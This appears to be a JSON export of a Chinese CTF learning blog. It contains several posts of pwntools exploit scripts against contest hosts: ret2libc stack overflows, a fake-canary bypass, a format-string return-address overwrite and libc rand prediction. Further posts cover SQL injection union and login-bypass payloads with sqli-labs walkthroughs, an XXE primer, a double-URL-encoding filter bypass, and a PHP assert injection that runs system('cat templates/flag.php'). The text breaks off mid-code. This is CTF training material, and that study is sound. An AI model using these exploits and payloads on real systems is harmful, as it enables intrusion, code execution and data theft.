rand()​ rand()函数是使用线性同余法做的，它并不是真的随机数，因为其周期特别长，所以在一定范围内可以看成随机的。​ rand()函数不需要参数，它将会返回0到RAND_MAX之间的任意的整数。 这里用到了python与c语言交互的一个库 关于ctype库与dll我们使用python标准库中自带的ctypes模块进行python和c的混合编程libc共享库可以使用ldd查找 注意，我们在使用sendlineafter()函数的时候不可以加上\\n，这样的话是无法识别的 同时输入的为字符串形式 上exp 1234567891011121314#encoding=utf-8from pwn import *from ctypes import *#p = process(\"./1\")p = remote(\"111.198.29.45\",38308)libc = cdll.LoadLibrary(\"/lib/x86_64-linux-gnu/libc.so.6\")context.log_level='debug'#print p.recvuntil(\"Your name:\\n\")payload = 'a' * 32 + p64(1)p.sendlineafter(\"name:\",payload)for i in range(10): p.sendlineafter(\"number:\",str(libc.rand()%6 + 1))print p.recvall() 9 整数溢出知识点：整数溢出 详情见自己写的博客或ctf_wiki 12345678910111213141516171819#encoding=utf-8#Author:summerNfrom pwn import *p = remote(\"111.198.29.45\",51446)#p = process(\"./1\")print p.recvuntil(\"Your choice:\")payload1 = \"1\"p.sendline(payload1)print p.recvuntil(\"Please input your username:\\n\")payload2 = \"summerN\"p.sendline(payload2)print p.recvuntil(\"Please input your passwd:\\n\")payload3 = \"a\" * (0x14 + 4) + p32(0x804868b)payload3 = payload3.ljust(259,'b') #范围p.sendline(payload3)print p.recvall() 10一个通过栈溢出漏洞使用write函数泄露libc基地址的题目 libc文件题目已经给出 获取基地址后基本的rop exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './level3'libc_name = 'libc_32.so.6'#libc_name = '/lib/i386-linux-gnu/libc.so.6'ip = '111.198.29.45'port = '42539'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']libc = ELF(libc_name)elf = ELF(file_name)#p = process(file_name)p = remote(ip,port)offset = 0x88libc_got = elf.got[\"__libc_start_main\"]#print libc_gotwrite_plt = elf.plt[\"write\"]main = 0x8048484payload1 = \"a\" * (offset + 4) + p32(write_plt) + p32(main) #此处的main未返回地址payload1 += p32(1) + p32(libc_got) + p32(4)#使用write泄露libc基地址print payload1p.recvuntil(\"Input:\\n\")p.sendline(payload1)#gdb.attach(p)#p.recvuntil('@\\n')write_add = u32(p.recv(4).strip(\"\\n\").ljust(4,\"\\x00\"))print hex(write_add)libc_add = write_add - libc.symbols['__libc_start_main']sys_add = libc_add + libc.symbols['system']bin_add = libc_add + libc.search('/bin/sh').next()payload2 = \"a\" * (offset + 4) + p32(sys_add) + 'aaaa' + p32(bin_add)print p.recvuntil(\"Input:\\n\") p.sendline(payload2)p.interactive()","categories":[],"tags":[]},{"title":"安恒月赛暨北京工业大学","slug":"安恒月赛暨北京工业大学","date":"2019-12-21T12:40:17.896Z","updated":"2019-12-29T02:29:52.576Z","comments":true,"path":"2019/12/21/安恒月赛暨北京工业大学/","link":"","permalink":"http://yoursite.com/2019/12/21/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%9A%A8%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6/","excerpt":"安恒月赛暨北京工业大学","text":"安恒月赛暨北京工业大学 pwn1.fantasy简单的栈溢出 exp： 123456789101112131415161718192021222324#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *file_name = './fantasy'libc_name = ''ip = '183.129.189.60'port = '10025'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)p = remote(ip,port)offset = 0x30sys_add = 0x400735payload = \"a\" * (offset + 8) + p64(sys_add)p.recvuntil(\"input your message\\n\")p.sendline(payload)p.interactive() 2.how do cannary work这个题没有cannary保护 但是有挨千杀的出题人写的canary 这个cannary是由malloc传入的 用过gdb调试后发现是由两个变量比较 其中一个变量引入的是地址 另一个变量保存了进行check的字符串 我们只需找一个内存为0的地址传入，之后覆盖掉另一个变量为0即可 剩下的即为简单rop，调用puts泄露libc之后rop 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './my_cannary'libc_name = '/lib/x86_64-linux-gnu/libc.so.6'ip = '183.129.189.60'port = '10026'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)#p = process(file_name)p = remote(ip,port)offset = 0x40#puts_plt = elf.plt['puts']puts_plt = 0x400670print puts_pltputs_got = elf.got['puts']print puts_gotpop_add = 0x400a43main_add = 0x400998backdoor = 0x000000000600fe8 #地址指向为0payload1 = \"a\" * 0x30 + p64(backdoor) + p64(0x0) + \"a\" * 8 + p64(pop_add) + p64(puts_got) + p64(puts_plt) + p64(main_add)p.recvuntil(\"n\\n\")#payload1 = \"a\" * (offset + 8) + p64(pop_add) + p64(puts_got) + p64(puts_plt) + p64(main_add)p.sendline(payload1)#print p.recvall()put_add = u64(p.recvline().strip(\"\\n\").ljust(8,\"\\x00\"))print put_addlibc = LibcSearcher(\"puts\",put_add)libc_add = put_add - libc.dump(\"puts\")sys_add = libc_add + libc.dump(\"system\")bin_add = libc_add + libc.dump(\"str_bin_sh\")p.recvuntil(\"n\\n\")payload2 = \"a\" * 0x30 + p64(backdoor) + p64(0x0) + \"a\" * 8 + p64(pop_add)payload2 += p64(bin_add) + p64(sys_add)p.sendline(payload2)p.interactive()","categories":[],"tags":[]},{"title":"SWPUCTF","slug":"SWPUCTF","date":"2019-12-16T12:41:58.763Z","updated":"2019-12-21T12:47:03.145Z","comments":true,"path":"2019/12/16/SWPUCTF/","link":"","permalink":"http://yoursite.com/2019/12/16/SWPUCTF/","excerpt":"pwn2","text":"pwn2 先check 还可以、 这个题涉及了bss段的格式化字符串把漏洞，需要通过改写栈上的地址来挟持返回地址，之后再改写我们想输入的字符串（bin/sh） 难度在于 1.查找libc版本 2.改写链的地址 3.对于改写的话需要一个一个字节的去改写，具体看脚本 login.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/python2#encoding:utf-8#__author__='pumpkin9@DL&amp;S'from pwn import *import sys# context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')file_name = './login'libc_name = '/lib/i386-linux-gnu/libc.so.6'ip = '108.160.139.79'port = '9090'# context.arch = 'amd64'# context.log_level='debug'context.terminal=['tmux','split','-h']lib = ELF(libc_name)elf = ELF(file_name)p = process(file_name)# p = remote(ip,int(port))li = lambda name,x : log.info(name+':0x%x'%x)ls = lambda name,x : log.success(name+':0x%x'%x)key = \"wllmmllw\"p.sendlineafter(\"Please input your name: \\n\",\"pumpkin9\")payload = \"%15$p\"p.sendlineafter(\"password: \\n\",payload)p.recvuntil(\"This is the wrong password: \")libc = int(p.recvuntil(\"\\n\",True),16)-241-lib.symbols['__libc_start_main']#获取libc基地址ls(\"libc addr\",libc)onegg = libc + lib.symbols['system']#获取system地址ls(\"one_gadget\",onegg)binsh = libc + lib.search('/bin/sh').next()#获取bin/sh地址ls(\"sh addr\",binsh)p.recvuntil(\"Try again!\\n\")p.sendline(\"%6$p\")p.recvuntil(\"This is the wrong password: \")stack = int(p.recvuntil(\"\\n\",True),16)#获取的是ebp中的内容target = stack -12 #这个的计算结果为返回地址ls(\"stack addr\",stack)ls(\"target addr\",target)gdb.attach(p)num = target&amp;0xff#进行按位与运算目的是除去多余的位数，在这里是保留后12位data1 = 0x100#onegg&amp;0xffdata2 = (onegg&amp;0xffff)&gt;&gt;8 #右移位运算获取第二个字符位data3 = (onegg&amp;0xffffff)&gt;&gt;16#获取第三个字符位data4 = onegg&gt;&gt;24#获取第四个字符位li(\"sys1\",data1)li(\"sys2\",data2)li(\"sys3\",data3)li(\"sys3\",data4)data5 = binsh&amp;0xff#同data1-4的作用data6 = ((binsh&amp;0xffff)&gt;&gt;8)data7 = ((binsh&amp;0xffffff)&gt;&gt;16)data8 = binsh&gt;&gt;24li(\"sh1\",data5)li(\"sh2\",data6)li(\"sh3\",data7)li(\"sh4\",data8)p.sendlineafter(\"Try again!\\n\",\"%\"+str(num)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data1)+\"c%10$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+1)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data2)+\"c%10$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+2)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data3)+\"c%10$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+3)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data4)+\"c%10$hhn\")gdb.attach(p)p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+8)+\"c%6$hhn\")#参数放到返回地址后面即可p.sendlineafter(\"Try again!\\n\",\"%\"+str(data5)+\"c%10$hhn\")#但是为什么要间隔四个字节呢p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+9)+\"c%6$hhn\")#对于32位的程序根据libc中的system一般都要这样p.sendlineafter(\"Try again!\\n\",\"%\"+str(data6)+\"c%10$hhn\")#先记住p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+10)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data7)+\"c%10$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+11)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data8)+\"c%10$hhn\")#raw_input('#')p.sendlineafter(\"Try again!\\n\",key)p.interactive()","categories":[],"tags":[]},{"title":"web狗之xml实体攻击","slug":"web狗之xml实体攻击","date":"2019-12-16T02:37:33.979Z","updated":"2019-12-29T02:32:19.103Z","comments":true,"path":"2019/12/16/web狗之xml实体攻击/","link":"","permalink":"http://yoursite.com/2019/12/16/web%E7%8B%97%E4%B9%8Bxml%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB/","excerpt":"web狗之xml实体攻击浅学","text":"web狗之xml实体攻击浅学 我们先来了解一下xml 123456789101112&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;note&gt;&lt;to&gt;chybeta&lt;&#x2F;to&gt;&lt;from&gt;ph0en1x&lt;&#x2F;from&gt;&lt;&#x2F;note&gt;在上面代码中的第一行，定义XML的版本与编码。在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，&lt;note&gt;是整个文档的根元素。嵌套在note标签中的&lt;to&gt;和&lt;from&gt;则是根的子元素。同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。我们再了解一下实体： 123所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。实体类型：XML实体分为四种：字符实体，命名实体，外部实体，参数实体。 文档类型定义：DTD 12345简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。其基本格式：&lt;!DOCTYPE 根元素名 [ 元素描述 ]&gt; 内部引入格式： 将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。例如： 12345678910&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY chybeta &quot;Hello World!&quot;&gt;]&gt;&lt;xxe&gt;&amp;chybeta;&lt;&#x2F;xxe&gt; 访问该XML文档，&amp;chybeta;会被解析为Hello World!并输出。 外部引入基本格式： 12345&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 通过引用定义在外部的DTD中的实体，我们称之为外部实体。 之后呢，我们通过jarvis上的一道web题来尝试一下：http://web.jarvisoj.com:9882/我们先进行一下抓包之后呢我们发现第一个红箭头的位置，使用的是json方式传入我们改为xml，之后编写代码进行传入go后我们得到flag小白，还请多多关照","categories":[],"tags":[]},{"title":"urldecode二次编码绕过","slug":"urldecode二次编码绕过","date":"2019-12-16T02:37:33.963Z","updated":"2019-12-29T02:32:08.837Z","comments":true,"path":"2019/12/16/urldecode二次编码绕过/","link":"","permalink":"http://yoursite.com/2019/12/16/urldecode%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/","excerpt":"代码审计日志三urldecode二次绕过","text":"代码审计日志三urldecode二次绕过 题目： 123456789101112131415161718192021&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;echo(&quot;not allowed!&quot;);exit();&#125;$_GET[id] &#x3D; urldecode($_GET[id]);if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)&#123;echo &quot;Access granted!&quot;;echo &quot;flag&quot;;&#125;?&gt; 经过审计：由 1$_GET[id] &#x3D; urldecode($_GET[id]); 可知，我们需要将hackerDJ进行urldecode编码后get上传我们上传后得到：not allowed!再看url发现我们get传入的url编码值被浏览器自动解码因此我们需要再一次进行编码上传后得到flag","categories":[],"tags":[]},{"title":"sql语句之where字句学习笔记","slug":"sql语句之where字句学习笔记","date":"2019-12-16T02:37:33.948Z","updated":"2019-12-29T02:31:15.611Z","comments":true,"path":"2019/12/16/sql语句之where字句学习笔记/","link":"","permalink":"http://yoursite.com/2019/12/16/sql%E8%AF%AD%E5%8F%A5%E4%B9%8Bwhere%E5%AD%97%E5%8F%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"sql语句之where字句学习笔记","text":"sql语句之where字句学习笔记 我们先说一下wherer字句作用： 1限制表中的数据返回 符合where后面的条件的数据就会被选中，不符合where条件的语句会被过滤掉 1.两个极限条件 12where 1 &#x3D; 1where 1 &#x3D; 2 自我感觉一般用来完善sql语法补齐引号2.字符串条件的表达就像我们爆表的那个常用语句 1?id&#x3D;0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() 先说明一下table_schema 的意思是数据库名database()是返回当前的数据库名因此此处的where意思是指：查询的范围被限定在了此数据库中，即起到约束作用3.模糊查询格式为：like（像）+ 通配符 （1） “%”为通配符，代表0 - n个任意字符 （1）“-”代表一个任意字符例如： 1SELECT * FROM news WHERE keyword like &#39;%$keyword%&#39; 意思就是此查询news中所有的含有我们所输入的$keyword的字符串（暂且先这样说） 1where name like ‘_$keyword%’ 这个就是查询中间为我们所输入的字符串@当我们要查询例如’$keyword_’时，我们要进行转义即使用\\ 1where name like &#39;$keyword\\_%&#39; 4.还有使用一些条件链接符号进行限制条件","categories":[],"tags":[]},{"title":"sqli-lab 学习记录less2","slug":"sqli-lab 学习记录less2","date":"2019-12-16T02:37:33.932Z","updated":"2019-12-29T02:31:56.348Z","comments":true,"path":"2019/12/16/sqli-lab 学习记录less2/","link":"","permalink":"http://yoursite.com/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95less2/","excerpt":"sqli-lab 学习记录less2","text":"sqli-lab 学习记录less2 less21.我们先来判断这次的sql注入类型我们输入 12?id&#x3D;1?id&#x3D;1&#39; 发现第一个语句返回正确但是第二个却有了报错我们因此可以判断这次的sql注入类型为数字类型 2.之后和less1一样我们进行暴表的名字（暴表）我们输入 1?id&#x3D;0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() 我们由此得到3.我们之后开始爆列喽输入 1?id&#x3D;0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; 我们可以得到4.最后我们来获得我们要得到的东西输入代码 1?id&#x3D;0 union select 1,group_concat(id,username,password),3 from users 就得到了我们要得到的东西另外我们附加关于where的知识 table_schema是数据库名database()函数会返回当前的数据库名)where就是约束条件这个 where后面 就是为了约束一下 我要查询的数据库 而不是去 看其他数据库里的东西我要看的 东西 就是 当前数据库database里的 不是其他的数据里的比如 有两个数据库 数据库1 数据库2 当前的数据库database是数据库1 你可以 where table_schema=database() 或者是where table_schema=’数据库1’","categories":[],"tags":[]},{"title":"sql注注入类型解释","slug":"sql注注入类型解释","date":"2019-12-16T02:37:33.932Z","updated":"2019-12-29T02:31:33.351Z","comments":true,"path":"2019/12/16/sql注注入类型解释/","link":"","permalink":"http://yoursite.com/2019/12/16/sql%E6%B3%A8%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%A7%A3%E9%87%8A/","excerpt":"sql注入类型简单记录","text":"sql注入类型简单记录 sql注入类型简单记录1.sql注入流程（1）判断注入点（2）判断注入类型（3）判断数据库类型（3）获得数据库数据，提权一、判断注入点 所有的输入只要和数据库进行交互的，都有可能触发SQL注入一般有三类Get参数触发SQL注入POST参数触发SQL注入Cookie触发SQL注入 1234一般我们输入&#39;来判断 是否存在注入点如果页面返回错误，则存在 Sql 注入原因是：原因是无论字符型还是整型都会因为单引号个数不匹配而报错。 二、判断注入类型我们来了解一下：有以下几种注入类型：（1）数字型注入点（2）字符型注入点（3）搜索型注入点（4）内嵌式sql注入（5）终止试sql注入之后我们进行解释：1.数字型注入点测试方法： 1234http:&#x2F;&#x2F;host&#x2F;test.php?id&#x3D;100 and 1&#x3D;1 返回成功http:&#x2F;&#x2F;host&#x2F;test.php?id&#x3D;100 and 1&#x3D;2 返回失败 为什么呢 假设我们网站的SQL查询的语句是这样的SELECT * FROM news WHERE id=$id那么这个$id 即为用户提交的 当我们输入的是100 and 1=1语句就变成了这样SELECT * FROM news WHERE id=100 and 1=1对于and 12345这个SQL语句and左边是返回成功的，因为我们是在有这个id的情况下后面加上我们的注入语句，如果这个id不存在，那就没法测试了而在and右边，1&#x3D;1也是恒成立的，所以整个语句返回的是成功当然，如果后面改成了1&#x3D;2的话，因为1&#x3D;2是不成立的，and语句的判断逻辑是只要有一个不成立，就返回失败，所以1&#x3D;2最后会返回的是失败 因此我们可以这样进行判断2.字符型注入点测试方法： http://host/test.php?name=man&#39; and ‘1’=’1 返回成功 http://host/test.php?name=man&#39; and ‘1’=’2返回失败 这里就使上面的数字型变为了字符型 原因如下： 还是假设我们网站的SQL语句是这样的 SELECT * FROM news WHERE name=&apos;$name&apos; 当我们构造输入为下面这个的时候 man&apos; and &apos;1&apos;=&apos;1 语句就变成了 SELECT * FROM news WHERE name=&apos;man&apos; and &apos;1&apos;=&apos;1&apos;发现什么了没？这个SQL已经闭合了 还是一样的，这里and的左边是一定成立的，而and右边也是一样的成立，所以and逻辑之后，整个语句返回成功 同理可知如果后面是1&apos;=&apos;2就会返回失败，当然，这里不一定非要是1或者2，因为是字符型，所以我们可以输入任何字符比如这样 http://host/test.php?name=man&apos; and &apos;a&apos;=&apos;a 返回成功 http://host/test.php?name=man&apos; and &apos;a&apos;=&apos;b返回失败 3.搜索式sql注入 测试方法 http://host//test.php?keyword=python%&#39; and 1=1 and ‘%’=’ http://host//test.php?keyword=python%&#39; and 1=2 and ‘%’=’ 假设我们的SQL查询语句是这样的 SELECT * FROM news WHERE keyword like &apos;%$keyword%&apos; 这里的$keyword是用户的输入 当我们输入以下语句的时候 pt%&apos; and 1=1 and &apos;%&apos;=&apos; 最终我们得到的语句是这样的 SELECT * FROM news WHERE keyword like &apos;%pt%&apos; and 1=1 and &apos;%&apos;=&apos;%&apos; 这个语句又一次的闭合了这里我们再分析以下，因为是and逻辑，只要有一个错误，就返回错误 我们可以把这个语句分为三段 SELECT * FROM news WHERE keyword like &apos;%python%&apos; and 1=1 and &apos;%&apos;=&apos;%&apos; 第一行的语句肯定是成功（再强调一遍，我们要在存在的查询上构造SQL注入） 第二句也是，第三句也是，因为自己肯定等于自己啊 但是如果我们把第二句换成1=2，那么这个语句肯定就会返回失败了，就是这个原理4.内嵌式sql注入内联注入是指查询注入SQL代码后，原来的查询仍然全部执行 假设我们的网站SQL查询语句是这样的 SELECT * FROM admin WHER username=’$name’ AND password =’$passwd’ 这一看就是个登录页面的代码 假如我们构造如下语句提交到登录框中的username &apos; or &apos;&apos;=&apos; 或者提交到password框里面，这两种提交方法是不一样的，我们下面就来分析一下这两个提交方法 提交到username我们的语句就会成为这样 SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;fuzz是我们随便输入的字符串 而提交到password则会是这样的 SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos; or &apos;&apos;=&apos;&apos;注: 在SQL语句中，AND的优先级是大于OR的 先计算AND，然后计算OR，所以这里我们的语句会被OR分为两段SQL语句 这是username框的 SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;或者password框的是这样 SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos; or &apos;&apos;=&apos;&apos;我们首先用第一个来分析 首先计算AND之后 SELECT * FROM admin WHER username=&apos;&apos;返回失败 or &apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;返回失败数据库是不会存在username为NULL的字段的，所以第一句返回的是失败，第三句中，因为password是我们随便输入的，99.99%是不会存在这个密码的，于是AND之后，我们的第三句也是失败的，所以整个语句返回失败的 但是我们的password情况就不一样了 SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos; or &apos;&apos;=&apos;&apos;这里我们第一句是返回失败的，但是我们的第二句’’=’’是返回成功的，OR逻辑是有一个是成功就返回成功，于是我们的整个语句就会返回成功 返回成功之后我们就会绕过登录表单直接登录系统了5.终止式sql注入终止式SQL语句注入是指攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句 于是被注释的查询不会被执行，我们还是拿上面那个例子举例 我们上面已经知道，在username框内填入 &apos; or &apos;&apos;=&apos; 程序是不会返回成功的，我们就没有办法在username做文章了吗？错了，我们还有终止式 还是上面那个SQL查询语句 SELECT * FROM admin WHER username=’$name’ AND password =’$passwd’ 这里我们构造如下username输入 &apos; or &apos;&apos;=&apos;&apos; --之后我们就可以得到如下的查询语句 SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; --&apos; AND password =&apos;fuzz&apos;这里的fuzz是我们随便输入的，–是注释符 这样，我们的语句就可以分为三个部分了 SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; 返回成功 --&apos; AND password =&apos;fuzz&apos;第一句肯定是返回失败的，但是我们第二句会返回成功 后面已经被我们注释掉了，是不会执行的，所以我们还是可以通过在username做这个手脚来绕过登录 下面是我们常见的一些终止方式终止字符串： – ， #， %23， %00， /*终止方法： – , ‘– , ‘)– , ) – , ‘)) –, ))–","categories":[],"tags":[]},{"title":"sqli-lab 学习记录 less3-less4","slug":"sqli-lab 学习记录 less3-less4","date":"2019-12-16T02:37:33.917Z","updated":"2019-12-29T02:31:44.084Z","comments":true,"path":"2019/12/16/sqli-lab 学习记录 less3-less4/","link":"","permalink":"http://yoursite.com/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%20less3-less4/","excerpt":"sqli-lab 学习记录 less3-less4","text":"sqli-lab 学习记录 less3-less4 less3:进入界面我们先进行判断注入的类型我们输入 1?id&#x3D;1 有正常回显之后我们在输入 1234?id&#x3D;1&#39;发现出现了：![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20190319192230358.png)根据后面的报错我们可以大致的判断此sql语句是这样的： 1SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot; 之后呢，我们来验证我们的判断我们输入 1?id&#x3D;1&#39;) %23 得到正常回显因此我们就确定了注入类型之后的步骤就和我们之前做less1与2一样了这里就不过多解释了 less4我们还是一样判断注入类型(这个类型与less3相似，但是爆出错误却很难)我刚开始输入了 123?id&#x3D;1?id&#x3D;1&#39;?id&#x3D;1 and 1&#x3D;2 均有回响弄得我一脸懵逼之后尝试使用 1?id&#x3D;1&quot; 终于爆出了错误从错误中我们大致可以判断应该是类似于（“ $id ”）我们可以构造 1?id&#x3D;1&quot;) %23 得到正常回显之后我们的步骤和之前一样就可以了 萌新文章，还请大佬们指导邮箱：497710073@qq.com","categories":[],"tags":[]},{"title":"sqli-lab less1","slug":"sqli-lab less1","date":"2019-12-16T02:37:33.901Z","updated":"2019-12-29T02:32:01.867Z","comments":true,"path":"2019/12/16/sqli-lab less1/","link":"","permalink":"http://yoursite.com/2019/12/16/sqli-lab%20less1/","excerpt":"sqli-lab 学习记录","text":"sqli-lab 学习记录 Less 11，我们先要爆出他的字段数，即列的数目插入知识：information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。感觉information_schema就像是MySQL实例的一个百科全书，记录了数据库当中大部分我们需要了结的信息，比如字符集，权限相关，数据库实体对象信息，外检约束，分区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。数据库拥有一个名为tables的数据表，该表包含两个字段table_name和table_schema,分别记录DBMS中的存储的表名和表名所在的数据库。 ’ or 1=1 –+ （–后要加空格才能注释，但是在网址栏输入时最后加空格解析时会被去掉，所以用+，当然用%20也行）’ or 1=1 # （火狐下在url栏用#注释会报错，改成url编码%23即可）我们使用如下代码 123?id&#x3D;1&#39; order by 1 %23?id&#x3D;1&#39; order by 2 %23?id&#x3D;1&#39; order by 3 %23 当我们进行到order by 4 %23时，我们发现报错，所以我们判断有三列对了，要判断注入点输入 1?id&#x3D;1&#39; 会报错显示所以差不多我们输入的就放在了这对引号内ok2.之后我们进行爆表 1?id&#x3D;0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() %23 得到了我们判断用户名在users中之后爆列喽附加一些资料) 1?id&#x3D;0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; %23 得到：之后我们再得到我们需要的内容 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 1,group_concat(id,username,password),3 from users %23 最后我们就得到了我们想要的：累死了，，，加油吧","categories":[],"tags":[]},{"title":"jarvis OJ web babyphp","slug":"jarvis OJ web babyphp","date":"2019-12-16T02:37:33.885Z","updated":"2019-12-29T02:31:06.811Z","comments":true,"path":"2019/12/16/jarvis OJ web babyphp/","link":"","permalink":"http://yoursite.com/2019/12/16/jarvis%20OJ%20web%20babyphp/","excerpt":"babyphp","text":"babyphp 考完二级后我又要回归web狗了今天做到一道web题上题：http://web.jarvisoj.com:32798/ 进入后：发现应该有git泄露因此我们使用githack进行获得源码 1234打开cmd输入：python2 GitHack.py http:&#x2F;&#x2F;web.jarvisoj.com:32798&#x2F;.git&#x2F;#这里的python2是我设置的用于区分python3即这个脚本要使用python2 之后我们得到源码： 当然如果我们直接在打开flag.php的话没用的，因为emmm标志被注释掉了)我们重点来看这里：assert（）函数这个我也不算太懂，但是只要是这一句话如果assertion是字符串，那么此字符串会被当做php代码执行因此我们就可以进行php注入（我的第一次php注入）我们在url后面输入 1?page&#x3D;&#39;. system(&quot;cat templates&#x2F;flag.php&quot;).&#39; 这个代码的意思是打开flag.php 所在的templates文件中的此文件为什么知道他在那里，因为有： 输入payload后我们查看源代码得到flag为什么要查看源码才能看到了，因为标志被注释了呀（源代码的那部分是绿色的）","categories":[],"tags":[]},{"title":"python将时间戳转化为时间","slug":"python将时间戳转化为时间","date":"2019-12-16T02:37:33.885Z","updated":"2019-12-29T02:31:08.344Z","comments":true,"path":"2019/12/16/python将时间戳转化为时间/","link":"","permalink":"http://yoursite.com/2019/12/16/python%E5%B0%86%E6%97%B6%E9%97%B4%E6%88%B3%E8%BD%AC%E5%8C%96%E4%B8%BA%E6%97%B6%E9%97%B4/","excerpt":"python将时间戳转化为时间","text":"python将时间戳转化为时间 title:第一篇博客：python时间转换（将时间戳转化为时间）date: 2019-02-014 22:37:58tags: python的os.path模块中有着这样的一个函数 123os.path.getatime() #获得文件的最近访问时间os.path.getctime() #获得文件的创建时间os.path.getmtime() #获得文件的修改时间 我们就以第一个函数为例os.path.getatime()1.首先使用 1time.localtime() #将其转换为localtime的格式 2.将转化过来的时间进行格式化，使用 1time.strftime(&quot;%d:%b:%Y:%H:%M:%S&quot;,temp) #temp为转化过来的localtime格式时间 3.最后输出就行了完整的过程如下所示：` 1234567import osimport timetemp &#x3D; time.localtime(os.path.getatime(&quot;python.exe&quot;))#获取python.exe的最近访问时间，并将其localtime化temp1 &#x3D; time.strftime(&quot;(&quot;%d:%b:%Y:%H:%M:%S&quot;,temp)#将temp格式化print(temp1) （这是我第一次写博客，有啥不好的，大佬指教）邮箱：497710073@qq.com","categories":[],"tags":[]},{"title":"issctf     web1","slug":"issctf     web1","date":"2019-12-16T02:37:33.854Z","updated":"2019-12-29T02:30:29.585Z","comments":true,"path":"2019/12/16/issctf     web1/","link":"","permalink":"http://yoursite.com/2019/12/16/issctf%20%20%20%20%20web1/","excerpt":"标题issctf 中最简单的一个web题（耗费了我一个小时。。。。）","text":"标题issctf 中最简单的一个web题（耗费了我一个小时。。。。） 题目涉及知识点：1.php 中的几个函数（等会列举）2.php parse_str引起的变量覆盖漏洞 一、我们要了解的php函数即方法$SERVER[‘REQUEST_URI’]parse_urlparse_str二、由parse_str引起的变量覆盖漏洞parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。ok三、接下来打开题目&lt;?phperror_reporting(0);include(“flag.php”); $hashed_key = 